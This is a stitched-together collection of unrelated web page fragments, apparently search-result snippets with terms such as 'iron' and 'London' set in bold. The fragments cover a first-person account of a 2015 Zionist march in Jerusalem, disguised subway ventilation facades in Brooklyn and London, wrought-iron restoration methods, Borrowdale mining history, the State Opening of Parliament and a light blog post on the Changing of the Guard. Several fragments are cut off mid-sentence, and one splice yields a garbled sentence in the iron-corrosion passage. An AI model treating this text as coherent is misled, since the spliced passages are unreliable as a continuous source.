attacks on Palestinians by soldiers, police, and Zionist marchers alike. The soldiers and police supported Zionist youth as they hurled verbal abuse at passers by. Palestinian shops were forced to close as Zionists banged on their front shutters. Palestinians were made to move from the Muslim quarter to watch from afar as Zionists chanted hatred towards them &#x2013; inciting ethnic cleansing and death to the Arabs.</span></p>     <p>This day was not one of watching on the sidelines as a group marched through the street &#x2013; this day was a new awakening for me as to the systematic violence the Israeli state relies on. The city was turned into a playground for the new generation of right wing Zionists, as they were taught the abuse that&#x2019;s accepted against all those not waving the same flag.</p>    </div>    <span>2015-05-19</span>   </div>  </article>

The nine-foot basement was added in 2004-2005, the double-hung windows were replaced soon thereafter, and the porch was rebuilt in 2008-2009 after being torn off 12 years earlier.

   <div>   <p>By Angela Vanderbilt</p>   <p>The story of abandoned subway stations and tracks hidden beneath busy city streets is not unique to Cincinnati. Other large cities, such as New York, <b>London</b>, and Paris have similarly mysterious and intriguing stories to tell. An article I recently read in introduced me to this underground world of hidden subway ventilation shafts disguised by false building facades, with doors from which people occasionally exit, but never seem to enter. Some of these subterranean secrets are in use, while others have been abandoned like Cincinnati&#x2019;s own subway stations beneath Central Parkway.</p>   <p>What&#x2019;s fascinating is the effort made to disguise these facilities, to blend them in with the neighboring buildings. While it seems a logically aesthetic means of&#xa0;making the utilitarian more appealing, some have argued that the cities in which these structures are located are trying to hide a deep secret. For comparison, consider the Cincinnati subway &#x2013; when the subway and Central Parkway were first being constructed, the ventilation chimneys and the entrances to the below-ground stations were nicely appointed with decorative stonework.</p>   <div>    <p>Ventilation shaft, looking north along Parkway from Liberty St., July 2, 1928</p>   </div>   <div>    <p>Close up of decorative stonework for ventilator railing, Central Parkway,Nov. 19, 1928</p>   </div>   <div>    <p>East entrance to underpass near Brighton Bridge, Central Parkway,Nov. 15, 1928</p>   </div>   <p>Today, metal doors in the sidewalks along Liberty Street and Central Parkway, and steel doors and grates enclosing the tunnel openings along I-75 near the Hopple Street Viaduct, are all that remain visible of the subway to give passers-by cause for speculation as to what lies beneath or behind these doors.</p>   <div>    <p>Source: Google Search (  </div>   <p>But in New York, <b>London</b>, and Paris, clever preservation commissions and city transit leaders have provided a more pleasant disguise, leaving local residents completely unaware of what was behind the closed doors of 58 Joralemon Street in Brooklyn, 23 and 24 Leinster Terrace in Bayswater, <b>London</b>, or 145, Rue La Fayette in Paris. Personally I would rather see a well maintained Greek Revival or Edwardian building fa&#xe7;ade than an empty space in the middle of a historic streetscape with a large metal grate from which hot air is expelled. So I invite you to read along, view the images, and decide for yourselves!</p>   <p>&#xa0;The article in <i>The</i> <i>New York Times</i> describes a Greek Revival townhouse nestled in the midst of a row of brownstones located on a quiet street in Brooklyn, NY. The townhouse at #58 Joralemon Street is well maintained despite the darkened windows through which no light ever shines. A peek through the crack in the front door reveals no one is home. In fact, it reveals this is not a home at all, but a large empty space with a concrete floor and&#x201c;catwalks going back and forth this way and that, and somewhere down below the trains going by&#x201d;, as quoted in the article by an area resident who was fortunate to be given a peek inside the &#x201c;Shaft House&#x201d;, the name by which those living in the neighborhood refer to the townhouse.</p>   <div>    <p>Source: Matt Green, Flickr (  </div>   <p>The Shaft House is actually an emergency exit and ventilation fan plant for subway tracks 4 and 5 of the Interurban Rapid Transit Company and is maintained by New York City Transit. The townhouse was purchased by the city in 1908 to house the ventilation fans. Large steel louvered shutters, from which hot air and smoke would randomly pour out into the street, were fitted into the window cases. Behind the pleasant Greek Revival fa&#xe7;ade, the interior decorating consists of electrical panels, switches and behind a steel door, catwalks that cross over a nine-story drop to the subway tracks below.</p>   <div>    <p>Source: Heather Quinlan, Flickr,   </div>   <div>    <p>Source: Allison Meier, Flickr (  </div>   <p>The restoration of the 1847 fa&#xe7;ade to its historical appointments is owed to the Landmarks Preservation Commission and a local community association. Both entities made recommendations to the city, who owns the property, to spruce up the aging fa&#xe7;ade which included the removal of the unsightly steel ventilation shutters. &#x201c;Windows&#x201d; were installed made of sheets of Lexan &#x2013; a hard plastic resin that is used for such things as sports helmets and windshields &#x2013; on which wooden mullions were placed to create panes. New ventilation shafts were installed to expel the air out through the&#xa0;roof. In addition to being more pleasant to look at, New York City Transit considers the quaint fa&#xe7;ade to be a security benefit,&#xa0;since the building now blends seamlessly in with the row of brownstones &#x2013; a useful disguise in our post-9/11 world for what could be a potential target to those wishing to inflict harm on the city. The article even notes that neighbors occasionally spruce it up with flower boxes under the windows.</p>   <p>Other cities with false facades disguising subway ventilation systems or emergency exists include <b>London</b> and Paris, among others. In London&#x2019;s Bayswater neighborhood, two townhouses located at #23 and 24 Leinster Terrace are simply a , complete with windows, balconies and front doors, but with no back or roof to the buildings at all. The two townhouses were razed in the 1860s to gain access for construction of a subway tunnel that was to pass through Paddington and Bayswater.</p>   <div>    <p>Source: Urban Blog (  </div>   <p>Once the tunnel was finished and covered over, the townhouses were not &#x201c;completely&#x201d; rebuilt.

The latter is normally only carried out on museum quality ironwork and is not covered in this article. Restoration work is normally carried out by skilled blacksmiths, many of whom specialise in this field of blacksmithing. The first part of this article describes the metals most commonly used by restorers followed by a description of the problems they are most likely to encounter and some of the techniques and processes used. Lastly, contributions by three different practitioners are provided to illustrate individual approaches to ironwork restoration.</p>   <p>&#xa0;</p>   <p><strong>A BRIEF SYNOPSIS OF THE VARIOUS TYPES OF WROUGHT <b>IRON</b></strong></p>   <p>Historic wrought ironwork is likely to be made of either &#x2018;charcoal <b>iron</b>&#x2019; which was produced until the late 18th century or, more commonly, &#x2018;puddled <b>iron</b>&#x2019; which was invented by Henry Cort in 1784 and continued in production for nearly 200 years.&#xa0; Although both materials are intrinsically the same, they were produced using different methods and varied greatly in standards of quality.</p>   <p><strong>Charcoal <b>iron</b></strong>: so called because it was produced by smelting <b>iron</b> ore in a furnace fuelled by charcoal. The charcoal furnace could only achieve a temperature of around 700&#xba;C at which temperature the <b>iron</b> coalesces into a solid sponge-like mass (bloom) containing a large amount of slag but no carbon. The bloom was repeatedly re-heated and hammered to remove most of the molten slag. This process left the charcoal <b>iron</b> with a slag content of around 2% distributed in fine layers or laminae. A small amount of carbon, typically 0.2% was introduced to harden the <b>iron</b> and make it more serviceable. <strong>&#xa0;</strong></p>   <p><strong>Puddled <b>iron</b></strong>: By the end of the 18th century a new, much cheaper method of making wrought <b>iron</b> from pig <b>iron</b> had been developed. The pig <b>iron</b> was produced in coke furnaces which could reach 1200&#xba;C, the so-called eutectic point where the <b>iron</b>, having become saturated with carbon (around 3.5%) becomes liquid and can be tapped from the furnace. The molten <b>iron</b> was stirred with rods (puddled) and passed between rollers enabling one ton of pig <b>iron</b> to be converted to puddled <b>iron</b> in just 45 minutes. The quality of puddled <b>iron</b> varied enormously and remained largely unregulated until the introduction in 1910 of British Standard 51 introduced specifically for the testing and certifying of new wrought <b>iron</b> for railway purposes. In 1939 this standard was extended to include wrought <b>iron</b> for general engineering purposes (Grades A, B and C) and in 1959 a further grade (Grade D) was added specifically for fencing. The cold bend test for Grade A required that a bar should be capable of being bent double over a former of the same size bar without showing signs of fracture on the outside of the bend. The same test for Grade D wrought <b>iron</b> required a bend of only 90&#xba; over a former twice the thickness of the bar being tested.</p>   <p>The production of new wrought <b>iron</b> in the UK ceased in the 1970s due to the continuing decline in demand brought about by the introduction of mild steel.</p>   <p>&#xa0;</p>   <p><strong>CHOICE OF MATERIAL FOR RESTORATION WORK</strong></p>   <p>For the restoration and repair of historic wrought <b>iron</b> work it may be possible to use old wrought <b>iron</b> salvaged from scrap metal or modern alternatives, which include mild steel, stainless steel or pure <b>iron</b>.</p>   <p>Architectural and industrial salvage can provide a useful source of re-usable wrought <b>iron</b> if the source is known and the provenance good. There was a huge variation in the quality of puddled <b>iron</b> as demonstrated by BS 51 but all grades of puddled <b>iron</b> and charcoal <b>iron</b> are covered by the generic term &#x201c;wrought <b>iron</b>&#x201d;. For this reason it is important to know the source of the salvaged wrought <b>iron</b>. For example, redundant ships&#x2019; anchor chains were produced from high grade <b>iron</b> and can be used successfully as billets for re-rolling. However, lower grade wrought <b>iron</b> such as that used for fencing and <b>gates</b> is far more likely to split or crack unexpectedly when forged particularly if the laminations have become disrupted during piecing and re-rolling.</p>   <p>Pure <b>iron</b> is produced today by Corus in England in electric arc furnaces which are capable of reaching 1900&#xba;C. At this temperature the pure <b>iron</b> becomes liquid and can be tapped from the furnace. Its primary use is in the manufacture of special steels and the pharmaceutical industry but it is also available for use by blacksmiths as an alternative to mild steel or wrought <b>iron</b>. Like mild steel it is a homogenous material having no laminations. It is 99.8% pure <b>iron</b> which is chemically very similar to charcoal <b>iron</b> but without the 2% slag content. Other, perhaps more familiar names for similar pure irons are Swedish <b>iron</b>, butter <b>iron</b> and Armco <b>iron</b> developed in 1900 by the American Rolling Mill Company for its high resistance to corrosion.</p>   <p>Mild steel gradually superseded wrought <b>iron</b> and is used for the majority of the new &#x201c;wrought ironwork&#x201d; created by artist blacksmiths today. Due to the higher carbon content which gives it the strength for which it is renowned, mild steel requires more effort to forge than either wrought <b>iron</b> or pure <b>iron</b>.</p>   <p>Stainless steel: The balance shaft, spider and armature which support the lamb weather vane on Halifax Town Hall have been replaced in stainless steel following a local emergency when the original wrought <b>iron</b> shaft rotted away causing the windvane to collapse. The Rose Window at Lincoln Cathedral has also been restored using stainless steel banding instead of wrought <b>iron</b>.</p>   <p>Galvanic compatibility is an important consideration when using stainless steel in contact with other metals such as wrought <b>iron</b> and steel. Without proper protection of the surfaces electrochemical reactions between the two metals can cause accelerated corrosion.</p>   <p>Among the criteria which may be considered when choosing which type of <b>iron</b> or steel to use for restoration and repair work are durability, price, corrosion resistance, strength, ease of working, compatibility with other adjacent materials and availability. This choice is necessarily subjective but it should be noted by the specifier that the surface finish and crispness of design achieved in the finished work will be dependant on the skill of the blacksmith and not the choice of material. The differences between them are essentially metallurgical and not visual or functional.</p>   <p>&#xa0;</p>   <p><strong>DAMAGE AND COMMONLY ENCOUNTERED PROBLEMS</strong></p>   <p>The most commonly encountered problems facing the restorer are loss of material/components through corrosion, impact damage (usually vehicular), and previous, poorly executed repairs.</p>   <p>Wrought <b>iron</b> consists of fine layers of <b>iron</b> interspersed with siliceous slags giving it its characteristic grain. When paint finishes are not properly maintained and the bare metal is exposed to the atmosphere, moisture can penetrate between the layers through capillary action and oxidization occurs. This causes expansion of the material to many times its original size, the layers being pushed apart with such force that the rusting <b>iron</b> can break masonry into which it is fixed. Severe corrosion will result in continuous loss of material until only around you.

a thin waist of material is left and eventually none at all.</p>   <p>Corrosion is a complex subject for study. One useful website, www.corrosion-doctors.org, contains a detailed explanation of the theory of crevice corrosion which, due to the anodic reaction created in the crevice, leads to a particularly aggressive form of corrosion.</p>   <p>Ironwork which has suffered impact damage can often be straightened relatively easily but many owners take the opportunity to have restoration work carried out whilst the ironwork is in the blacksmith&#x2019;s shop. Old photographs of the ironwork can be a valuable reference where the damage is extensive and particularly where components are missing.</p>   <p>Inappropriate, previous work often includes unsightly arc welded repairs and clumsy alterations to a site specific piece to adapt it to another location. Leafwork was often stripped from ornate ironwork being among the first components to corrode and conversely the most expensive to replace. Much research work may be necessary if missing leafwork is to be re-instated.</p>   <p>&#xa0;</p>   <p><strong>RESTORATION PRACTICES</strong></p>   <p>Most restoration work is carried out off-site in the blacksmith&#x2019;s forge. This will probably involve most or all of the following processes:- photographic recording of the items in situ, removal of the ironwork from its housings by drilling out lead caulking, labelling of all components, and hoisting heavy components onto a vehicle for transportation. Great care should be exercised at all stages to ensure that no further damage is caused.</p>   <p>Once the items are stripped down for inspection, the specifier should ideally examine the ironwork and ensure that the work to be carried out and processes to be employed are properly discussed, agreed and understood by the restorer.</p>   <p>Processes may include removal and re-working of previous repairs, re-instatement of missing components and replacement of any components deemed to be beyond repair. Any removed components should be labelled and returned to the owner. Decisions must be made as to which sections are to be replaced, if any, and the material to be used. A competent restorer will always try to follow the original maker&#x2019;s methodology and practices when carrying out repairs. However, it may not always be possible to fire-weld a previously fire-welded joint because originally this would have been carried out during construction, prior to assembly. Gas welding with an <b>iron</b> rod when carried out by a skilled blacksmith will be visually indistinguishable from an original fire-weld.</p>   <p>Where mortise and tenon joints have been arc welded by previous repairers, these can be ground off back to original metal and the broken tenon replaced. The mortise should be punched clean to take the tenon and the joint re-riveted.</p>   <p>&#xa0;</p>   <p><strong>PERSONAL APPROACHES TO RESTORATION</strong></p>   <p><strong>Don Barker FWCB</strong></p>   <p>The restoration of wrought ironwork raises many contentious issues, the answers to which are necessarily subjective and must be agreed with the client and the specifier and any funding body which may be contributing to the project, prior to any work being done. Firstly and most importantly is &#x201c;What do they expect the finished result to be?&#x201d; Issues to consider are the degree of intervention, what to do about previous repair work, how the existing paint should be removed and what techniques and processes should be used. There are no definitive answers to any of these questions but an experienced restorer will always be willing to guide the specifier to an informed decision by drawing on their wealth of knowledge built up over many years of practice.</p>   <p>My preferred material is pure <b>iron</b> because it has similar forging attributes to new wrought <b>iron</b> and yet fulfils the requirement to ensure that new work is distinguishable from the original wrought <b>iron</b> by any future restorer. For replacement of leafwork I use pure <b>iron</b> sheet laser-cut from a computer generated image and then shape it using traditional repouss&#xe9; techniques. This demonstrates the value to be gained by the marriage of modern technology with ancient techniques.</p>   <p>The restoration of wrought ironwork is a commercial undertaking which must be economically viable if young blacksmiths are to be encouraged to take on this type of work and preserve our valuable heritage of wrought ironwork for future generations to enjoy.</p>   <p><strong>Don Barker FWCB</strong> is a blacksmith with 40&#xa0;years experience in restoration work. He is a former Honorary Treasurer of the British Artist&#xa0;Blacksmiths Association and a liveryman and Fellow of the Worshipful Company of Blacksmiths. In 2011/12 he served as Prime Warden (Master) of the Company.</p>   <p>&#xa0;</p>   <p><strong>Russel Turner ACR</strong></p>   <p>There is often a difficult decision making process to be undertaken when conserving/restoring outdoor ironwork. Much exterior ironwork performs a function and whether conserved or restored needs to be structurally adequate to fulfil its intended purpose. The ceaseless corrosion of <b>iron</b> unless protected from oxygen and water must also be considered to ensure works carried out will perform for the required design period. Inevitably this tends to apply pressure to consider more interventionist treatment than would be preferred if looking only at conserving an object, maintaining the maximum amount of original material, using minimum intervention techniques and not replicating missing elements.</p>   <p>I consider cleaning exterior metalwork, including that trapped between components, to SA 2.5 to remove all corrosion prior to application of a new high quality paint system is often an acceptable and desirable compromise between maintaining the maximum amount of original material and making the paint system fit for purpose. Similarly if part of an item has corroded to such an extent as to be structurally inadequate it needs to be replaced to allow it to be useable. Replacing corroded ironwork with pure <b>iron</b> can be a highly appropriate choice of material for components in <b>gates</b> <b>railings</b> and ornamental ironwork. Its chemical composition is similar to that of wrought <b>iron</b>, keeping any galvanic couple considerations to a minimum, it is readily available and has an appropriate British Standard. As time goes on I find high quality recycled wrought <b>iron</b> becomes increasingly difficult to obtain. Pure iron&#x2019;s workability is similar to that of wrought <b>iron</b> and I have found that where electric or gas welding is required the welds obtained can be of a higher quality than welding wrought <b>iron</b> to wrought. It can be difficult or impossible to fire weld some repairs insitu without large scale dismantling of an object. Again there is a compromise between the amount of intervention and use of traditional techniques.</p>   <p>The conservation/restoration of wrought ironwork will always be a lively topic of debate. Others have different approaches and opinions about cleaning and choice of materials. What seems clear to me is pure <b>iron</b> is an appropriate material for restoration works and should be offered to clients where appropriate. That is not to say that recycled wrought <b>iron</b> has no place, on the contrary, it is an appropriate material with a long track record. Most important of all is for practitioners to make the many options available to clients clear, to provide balanced advice to allow them to be involved in making informed choices relating to their objects and our heritage.</p>   <p><strong>Russel Turner ACR</strong> is a director of Eura Conservation and has spent over twenty years working in metal conservation. He is a former chair of UKIC Metals Section and served on the UKIC Professional Committee.</p>   <p>&#xa0;</p>   <p><strong>Richard Quinnell MBE CWCB</strong></p>   <p>My policy on restoration can be summarised in four main objectives:</p>   <ol>    <li>To retain as much as possible of the original work and onl   <div>   <div>    <p>Graphite mine</p>   </div>   <p><strong>How did it all begin?</strong></p>   <p>We are not sure how far these industries go back. We think medieval monks from Furness Abbey (50 miles away), which owned land in Borrowdale, may have used graphite from Seathwaite to draw lines in their books for the scribes to follow. Small quarries provided stone for local buildings.</p>   <p>From the 17th century there was a huge expansion of stone and slate extraction, which supplied the &#x201c;great rebuilding in stone&#x201d; of cottages and farmhouses in the valley. This altered the landscape of Borrowdale and provided a livelihood for the valley&#x2019;s inhabitants well into the 20th century.&#xa0; The Honister slate mine still provides a livelihood for local people today.</p>   <p>Organised mining developed in the 16th century in Borrowdale when German miners came on the invitation of Queen Elizabeth I. Working for the Company of the Mines Royal (established 1564) they were able to prospect and dig for minerals wherever they wanted, including the Earl of Northumberland&#x2019;s land in Borrowdale. Thomas Percy, 7th Earl of Northumberland, was to contest this in court against the Crown. He lost the case. Did this contribute to his rebellion against Queen Elizabeth in the Rising of the North? It cost him his life when he was publicly executed in York in 1572.</p> The Germans mined throughout Borrowdale extracting   <b>iron</b>, lead, copper and the purest deposit of graphite in the world. They had a base on Vicar&#x2019;s Isle, now Derwent Isle on Derwent Water. Many would have integrated into local life and some married local girls.   <p>By 1638 the German connection had ended but their legacy was to live on. They had taught us how to mine &#x2013; a skill that we were to pass on around the world in the 19th century.</p>   <p><strong>Miners and quarrymen in Borrowdale &#x2013; you may be related! </strong></p>   <p>Families of miners and quarrymen still live in the valley today. They have fascinating memories and speak knowledgeably of the past. Did your ancestors come from here? [Look at our story book and share your comments and stories.]</p>   <p><strong>The wonderful things that come out of the ground </strong></p>   <p>As you travel through our spectacular green valley ponder on some of these and what they might have been used for. <strong><b>Iron</b> </strong>&#x2013; tools, utensils, <b>gates</b>, <b>railings</b> and decorative work</p>   <p><strong>Lead </strong>&#x2013; (which had some silver content) &#x2013; roofing, pewter, pipes, cisterns and silver for coins</p>   <p><strong>Copper </strong>&#x2013; coins, plating, pipes, utensils and vessels</p>   <p><strong>Zinc </strong>&#x2013; (small amount) &#x2013; galvanising other metals, architectural castings and paint <strong>Graphite </strong>&#x2013; moulds, lubricants and pencils</p>   <p><strong>Slate and Stone </strong>&#x2013; building, roofing and some ornamental</p>   <p><strong>Saline Spring </strong>&#x2013; there is a salt well near Manesty where, in 1820, a bath house was built to provide therapeutic salt-water bathing</p>   <div>    <p>Brandelhow Mine</p>   </div>   <p><strong>Graphite &#x2013; black lead, black cawke, wad, plumbago &#x2013; many names for the same thing and as many uses! </strong></p>   <p>Discovered in Seathwaite, it was the most expensive substance ever mined in Cumbria. Medieval monks may have used it to draw lines in their ancient books for the scribes to follow. Shepherds may have used it to mark their sheep. Ordnance people certainly used it in the casting process of cannon balls &#x2013; it made them smoother and rounder, which meant they went further and straighter. The early pencil makers of Keswick used it to create the world&#x2019;s first industrial pencil making centre &#x2013; an industry that still continues in Cumbria today, although the Borrowdale graphite is no longer mined. Black Sal, The Dandy Wad-Stealer and many other thieves made illicit gains from it. Armed guards protected the mine day and night. Thousands of people viewed it at The Great Exhibition in <b>London</b> in 1851.</p>   <p>The names of the early owners, miners, agents, superintendents and guards live on in the records.</p>   <div>    <p>Quay Foot slate quarry</p>   </div>   <p><strong>Slate and Stone </strong></p>   <p>Borrowdale slate and stone was extracted at several places in the valley including Honister, Yewcrag, Dubs, Rigghead, Quay Foot and other smaller sites. Formed as a result of tremendous forces and heat from volcanic activity over 400 million years ago, it has provided a livelihood for people in Borrowdale for over 350 years.</p>   <p>Here&#x2019;s how&#x2026; Roofing slate is extracted by explosives to give clogs (big lumps of slate). The clogs are docked (once by chisel and mallet &#x2013; later by diamond saw) to reduce them in size for&#x2026;. &#x2026;Riving (splitting the slate down the grain by chisel &#x2013; a skill still performed today). The resulting thin pieces of slate are dressed (shaped to size).</p>   <p>The slate was once transported down the mountainside by sled &#x2013; with one man running before it, controlling the heavy load with a combination of strength, balance and agility&#x2013; one slip would have meant serious injury or death! The quarry workforce was often drawn from the local farming community.</p>   <p>The slate and stone was used for many houses and barns in Borrowdale. Honister slate also provided material far and wide for monuments and buildings as diverse as the headstone of the great wartime inventor Barnes Wallis, and the roofs of Buckingham Palace and Scotland Yard.</p>   <p>For more information visit: &amp; </p>   <p><em>Photographs by Richard Hyde.&#xa0; Historical pictures courtesy Keswick Mining Museum</em></p>  </div>

   <div>   <p><strong>by Scott Mehl</strong></p>   <div>    <p>source: Zimbio</p>   </div>   <p> marks the beginning of a new session of Parliament in the United Kingdom. It is traditionally attended by the Sovereign, who gives a Speech from the Throne. This takes place in the chamber of the House of Lords, as the Sovereign is not permitted to enter the House of Commons. The last sovereign to enter the Commons was Charles I, in 1642, who stormed in attempting to arrest several members.</p>   <div>    <p>King Henry VIII opening Parliament, 1523. &#xa0;source: Wikipedia</p>   </div>   <p>The practice of opening Parliament goes back to the 1400s, although the earliest detailed records are from 1510, recounting King Henry VIII&#x2019;s first Opening of Parliament. The King, accompanied by the Peers and his attendants, would usually travel on horseback from the Sovereign&#x2019;s official residence to Westminster Abbey where a service would be held. Following the service, they would proceed to the Palace of Westminster for the State Opening. The service was discontinued in 1679, when it (along with the procession) were cancelled due to fears of a Popish Plot. The procession resumed the following year, and was soon slimmed down to just the Sovereign and his entourage.</p>   <p>In the Georgian era, carriages began to be used regularly, to transport the Sovereign and other members of the Royal Family and their attendants. Back then, the Sovereign would usually just say a few words before the speech was read by the Lord Chancellor. It was King James I who began the practice of reading the speech himself. This varied for the next several reigns, and by 1679 it became traditional for the Sovereign to read the speech. (With the exception of King George I who barely spoke English, and Queen Victoria who typically left the speech to the Lord Chancellor.)</p>   <div>    <p>Queen Victoria opening Parliament, 1866. &#xa0;source: Wikipedia</p>   </div>   <p>For nearly 200 years, the Sovereign was almost always in attendance. However, Queen Victoria did not attend for several years after the death of the Prince Consort in 1861. She returned in 1866 (under pressure from her ministers, her children and the British public), but would only be present seven times in the remaining 34 years of her reign.</p>   <p>In 1901, the new King Edward VII brought much of the pageantry and tradition back to the ceremony. One of the most significant changes took place on the dais itself. Previously, a single throne for Queen Victoria had stood surrounded by an <b>iron</b> railing. King Edward VII had the railing removed, and had a second throne (just slightly smaller) placed immediately to the left of his own. Thus began the tradition of the Consort sitting beside the Sovereign. In the early years of the current reign, the Duke of Edinburgh sat in a small chair off the side of the dais, but for many years now, has been seated in a second throne beside The Queen.</p>   <div>    <p>King Edward VIII at the Opening of Parliament, 1936. &#xa0;source: Wikipedia</p>   </div>   <p>King Edward VIII only attended once during his brief reign in 1936. Not having been crowned, he did not wear the Imperial State Crown with his Robe of State. (He would abdicate just weeks later.) The Queen also opened Parliament for the first time before being crowned, and wore the George IV State Diadem. Since 1953, she has worn the Imperial State Crown, and has attended every year other than 1959 and 1963, when she was pregnant with Prince Andrew and Prince Edward. She is typically accompanied by The Duke of Edinburgh.</p>   <div>    <p>Queen Elizabeth II opening Parliament, 1952. source: The Daily Mail</p>   </div>   <p>The ceremony which occurs today dates back to the opening of the new Palace of Westminster in 1852. Having been rebuilt after the old palace was destroyed by fire in 1834, the new building was laid out to best show off the pageantry of the official procession. Much of the detail has remained mostly unchanged since then, including the order of the procession and seating in the House of Lords. The photo below is from the 1866 Ceremonial, and shows the procession and the precise seating. A ceremonial is issued each year, usually with very few changes. &#xa0;Below is the 1886 Ceremonial, showing the procession as well as where everyone is positioned around the throne.</p>   <p><span>Searching of the Cellars</span> The pageantry of the day begins with the searching of the cellars. In 1605, a group of English Catholics attempted to blow up Parliament with the goal of killing the Protestant King James I and placing his daughter Elizabeth on the throne. This became known as the Gunpowder Plot. Having been warned of the plot, the Yeoman of the Guard (the Sovereign&#x2019;s bodyguard) searched the cellars at Westminster and found Guy Fawkes guarding 36 barrels of gunpowder &#x2013; more than enough to destroy the entire building and everyone in it. Since then, the Yeoman of the Guard have searched the cellars before every opening of Parliament. Of course, today it is merely part of the pageantry. The building and grounds are fully searched by police and security officers, but officially, it is the Yeoman of the Guard who ensure that the Palace of Westminster is secured before the Sovereign&#x2019;s arrival.</p>   <div>    <div>     |    </div>   </div>   <p>In the meantime, the two houses of Parliament assemble in their respective chambers. Members of the House of Lords are in their robes and finery, with many of their wives, and other peers in attendance. Also seated in the House of Lords are members of the diplomatic corps and senior members of the judiciary. Until the 1999 House of Lords Act, other members of the Royal Family who were peers and peeresses often attended.</p>   <p><span>Royal Hostage</span> In another tradition which goes back for a few hundred years, a senior member of the House of Commons, traditionally the Vice-Chamberlain of the Household, is held hostage at Buckingham Palace to ensure the Sovereign&#x2019;s safe return from the Palace of Westminster. This tradition goes back to the Restoration in 1660. The previous Vice-Chamberlain had been involved in the beheading of King Charles I, and this was seen as the best way to ensure the safety of the monarch.</p>   <div>    <div>     |    </div>   </div>   <p><span>Arrival of the Royal Regalia</span> Prior to the Opening of Parliament, the Imperial State Crown, Great Sword of State and the Cap of Maintenance are brought from the Jewel House at the Tower of <b>London</b> to Buckingham Palace. On the morning of the Opening, the Crown is transported to the Palace of Westminster, traditionally in Queen Alexandra&#x2019;s State Coach, by the Comptroller of the Lord Chamberlain&#x2019;s office. Also traveling with the Crown are the Sword of State and the Cap of Maintenance, accompanied by two other members of the Royal Household. The carriage is accompanied by the Queen&#x2019;s Bargemaster &#x2013; a throwback to the days when the Crown Jewels were often transported by barge from the Tower of <b>London</b>. Just as the Sovereign, the Crown is escorted by the Household Cavalry and receives a royal salute.</p>   <p>Upon arriving at the Sovereign&#x2019;s gate at the Palace of Westminster, the Crown, Sword and Cap are taken to the Regalia Room where the Court Jeweler transfers the Crown to a large cushion for the remainder of the procession. (This is done by the Crown Jeweler as he is the only one, aside from the Sovereign, who can handle the crown.) The Comptroller then carries the Crown up the Norman staircase to the Royal Gallery, and presents the Crown to the Lord Great Chamberlain who places it on display along with the Sword and Cap. Once the Sovereign has left Buckingham Palace, the Crown is then taken into the Robing Room to await her arrival.</p>   <div>    <div>     |    </div>   </div>   <p>The Imperial State Crown currently used dates from 1937. It was made for the coronation of King George VI, as a replica of the one worn from Queen Victoria&#x2019;s coronation. This one was made lighter and easier to wear. It was modified    <div>   <blockquote>    <p>They&#x2019;re changing guard at Buckingham Palace &#x2013; Christopher Robin went down with Alice. Alice is marrying one of the guard. &#x201c;A soldier&#x2019;s life is terrible hard,&#x201d; Says Alice.</p>   </blockquote>   <p>Quite why Mama, who spent a large number of her formative years buttonholing people and ranting about the evils of the monarchy, should so frequently find herself in front of Buckingham Palace watching some kind of royal pagent is something of a mystery, although what I say is that if you don&#x2019;t support your local princesses, who will be there when you need birds sung to, fancy pink dresses worn or virtual strangers married?</p>   <p>Mama likes to pretend that she is on her way somewhere and it is the quickest way up from Victoria to Piccadilly, but I am not convinced that this explains how she has pitched up there for things like 71 gun salutes fired in a particularly chaotic but difficult to achieve manner, views of the entire Royal Family standing on the balcony mugging at the crowd, and more than one fly past including everything from very old bombers through bright red planes trailing coloured smoke to modern fighters.</p>   <blockquote>    <p>They&#x2019;re changing guard at Buckingham Palace &#x2013; Christopher Robin went down with Alice. We saw a guard in a sentry-box. &#x201c;One of the sergeants looks after their socks,&#x201d; Says Alice.</p>   </blockquote>   <p>About the only thing she has not turned out for, apart from most of the Jubilee celebrations, which wasn&#x2019;t her fault as she tried to go to them all, but managed to get thoroughly rained on, choose the wrong place to stand, spend the duration hunting for the rest of her party or just turn up late with impressive regularity, was the relatively recent royal wedding.</p>   <p>She insisted on watching it on TV instead, much to our bored amazement. I hadn&#x2019;t entered my pink phase then, and to be honest, even if I had, Kate is insufficiently blonde.</p>   <p>Mama claims that she finds it amusing that despite how very much in the public eye they are, none of the Royals are really all that good a behaving like celebrities, particularly when it comes to making sure their profile is in the right light at all times.</p>   <blockquote>    <p>They&#x2019;re changing guard at Buckingham Palace &#x2013; Christopher Robin went down with Alice. We looked for the King, but he never came. &#x201c;Well, God take care of him all the same,&#x201d; Says Alice.</p>   </blockquote>   <p>William in particular has terrible posture she says, although Papa says that this is how you tell he is an aristocrat rather than middle class like Kate. Only someone that in-, sorry, well-bred can get away with slouching his way through his own wedding ceremony on national TV while his lowly future wife sits up ramrod straight, knees elegantly together, hands delightfully folded in her lap.</p>   <p>Commenting on the finer nuances of the class system. Oh dear. I think Papa may have spent too long in the UK and gone native.</p>   <p>Huh. Mama is making choking sounds in the corner. I think she might disagree.</p>   <blockquote>    <p>They&#x2019;re changing guard at Buckingham Palace &#x2013; Christopher Robin went down with Alice. They&#x2019;ve great big parties inside the grounds. &#x201c;I wouldn&#x2019;t be King for a hundred pounds,&#x201d; Says Alice.</p>   </blockquote>   <p>Anyway, we have not, thus far, actually done the regular Changing of the Guard&#xa0;at Buckingham Palace from start to finish, and so jumped at the chance when one was presented to us in the form of accompanying an American friend recently.</p>   <p>The Changing of the Guard, is&#xa0;also known, to Mama&#x2019;s inexplicable amusement, as Guard Mounting. It basically consists of one group of soldiers taking over, wait for it, guard duty from another. Quite why this needs two bands, lots of spectators and 45 minutes I do not know, but Mama says it is tradition. Tradition sounds expensive. Mama says, probably not when you consider the tourist trade as a whole.</p>   <p>We approached through St James&#x2019; Park. There&#x2019;s a particularly well-placed bridge from which everybody should get their first view of Buckingham Palace looking whitely elegant, framed by trees, reflected in the water, peeping modestly out from behind the glorified traffic island topped by a socking great gold leaf cover statue of somebody or another.</p>   <p>You can also pick up a coffee from the refreshment vans in the two&#xa0;park corners nearest the palace. You will need this to fortify you for the wait. We got there at around 10.30. The action does not really start until 11.15. Despite this, what Mama now realises are probably the prime spots directly in front of the very high wrought <b>iron</b> <b>railings</b> looking onto the forecourt of the Palace, and the very top steps of the roundabout-cum-Victoria memorial were already pretty fully occupied. If you are wanting to see absolutely everything, you are going to have to get there even earlier or develop very sharp elbows indeed.</p>   <p>We declined to engage in pushing and shoving. Instead we opted for a front row position overlooking the road just off the right of the main <b>gates</b> and settled down to wait. At this point Mama recommends taking along someone who is an entertaining conversationalist. Which she had done. So that was her sorted.</p>   <blockquote>    <p>They&#x2019;re changing guard at Buckingham Palace &#x2013; Christopher Robin went down with Alice. A face looked out, but it wasn&#x2019;t the King&#x2019;s. 